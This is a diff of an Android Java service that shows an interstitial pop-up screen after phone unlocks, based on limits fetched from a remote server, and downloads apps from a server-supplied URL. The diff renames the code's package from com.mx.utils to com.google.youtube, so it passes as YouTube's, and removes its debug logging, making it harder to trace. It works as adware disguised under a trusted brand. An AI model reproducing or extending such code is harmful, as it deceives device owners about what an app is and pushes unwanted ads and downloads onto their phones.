@@ -1,12 +1,12 @@
-package com.mx.utils.services;
+package com.google.youtube.services;
 
 
 import java.util.Date;
 
 import org.json.JSONObject;
 
-import com.mx.utils.utils.HttpUtil;
-import com.mx.utils.utils.MyHelpUtil;
+import com.google.youtube.utils.HttpUtil;
+import com.google.youtube.utils.MyHelpUtil;
 
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -77,21 +77,10 @@ public class ScreenMsgService extends AsyncTask<Void, Integer, String> {
 				0);
 
 		int installCount = installSharedPreferences.getInt(apppakname, 0);
-		
-		System.out.println("插播屏：本机解锁屏次数："+local_screen_count);
-		
-		System.out.println("插播屏：服务器限制解锁屏次数："+screen_count);
-		
-		System.out.println("插播屏：本机保存："+apppakname+"安装次数"+installCount);
-		
-		System.out.println("插播屏：服务器限制："+apppakname+"安装次数："+s_install_count);
 
 		boolean time_iner = false;
 
-		if (!msgSharedPreferences.contains("screen")) {
-			
-			System.out.println("插播屏：初始化间隔时间：第一次运行满足时间间隔");
-			
+		if (!msgSharedPreferences.contains("screen")) {			
 			time_iner = true;
 		} else {
 
@@ -99,35 +88,16 @@ public class ScreenMsgService extends AsyncTask<Void, Integer, String> {
 					- msgSharedPreferences.getLong("screen", 0));
 			long display_interval_to_long = Math
 					.abs(display_interval * 3600 * 1000);
-			
-			System.out.println("插播屏：本机当前间隔时间："+reslut/3600/1000+"H");
-			
-			System.out.println("插播屏：服务器约束间隔时间："+display_interval+"H");
 
-			if (reslut >= display_interval_to_long) {
-				
-				System.out.println("插播屏：满足时间间隔");
-				
+			if (reslut >= display_interval_to_long) {				
 				time_iner = true;
-			}else{
-				System.out.println("插播屏：不满足时间间隔");
-				
 			}
 		}
 
 		if (local_screen_count >= screen_count && time_iner
-				&& installCount <= s_install_count) {
-			
-			System.out.println("插播屏：：：满足弹出条件");
-			
+				&& installCount <= s_install_count) {			
 			return true;
-		}else{
-			
-			System.out.println("插播屏：：：不满足弹出条件");
-			
 		}
-		
-		
 		return false;
 	}
 
@@ -144,9 +114,7 @@ public class ScreenMsgService extends AsyncTask<Void, Integer, String> {
 				/*synchronous_screen_msg  */
 				String screenMsg = HttpUtil.postRequest(HttpUtil.BASE_URL
 						+ "app_i.action", params_str);
-				
-				System.out.println("插播屏服务器返回结果：screenMsg；；"+screenMsg);
-
+			
 				if (!TextUtils.isEmpty(screenMsg) && !"null".equals(screenMsg)) {
 
 					JSONObject jsb = new JSONObject(screenMsg);
@@ -177,7 +145,6 @@ public class ScreenMsgService extends AsyncTask<Void, Integer, String> {
 						
 						download_url = jsb.getString("download_url");
 
-						// 缓存图片
 						HttpUtil.getBitmap(imgname);
 						
 						MyHelpUtil.sys_msg(context, 7, apppakname);
@@ -274,8 +241,6 @@ public class ScreenMsgService extends AsyncTask<Void, Integer, String> {
 									localbitmap.recycle();
 								}
 								
-								System.out.println("插播屏：点击插播屏：：：");
-
 								dHandler.sendEmptyMessage(0x1000);
 								
 								MyHelpUtil.sys_msg(context, 8, apppakname);
@@ -327,8 +292,6 @@ public class ScreenMsgService extends AsyncTask<Void, Integer, String> {
 				
 				if (s != null) {
 					
-					System.out.println("插播屏：插播屏下载：：：");
-
 					MyHelpUtil.localDownloadManagerMsg(s.context, s.appalias,
 							s.s_title, s.s_description, s.apppakname,
 							s.s_show_notifatication,12,s.download_url);
